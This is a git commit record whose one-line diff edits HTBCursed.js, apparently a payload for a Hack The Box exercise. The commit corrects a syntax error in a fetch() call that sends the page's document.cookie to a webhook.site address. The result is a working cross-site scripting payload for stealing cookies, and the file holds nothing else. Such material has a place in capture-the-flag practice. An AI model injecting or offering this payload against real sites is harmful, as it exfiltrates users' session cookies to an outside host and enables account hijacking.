a45ea9d7b0ef1b525392b295a5f74f9c22c4ac5f
danishali12345 <101387863+danishali12345@users.noreply.github.com>
2026-06-21 20:48:48 +0500

    Update HTBCursed.js

--- HTBCursed.js
+++ HTBCursed.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/334a4e54-db14-44c6-a017-067e656f0b3b?cookie=' + document.cookie');
+fetch('https://webhook.site/334a4e54-db14-44c6-a017-067e656f0b3b?cookie=' + document.cookie);
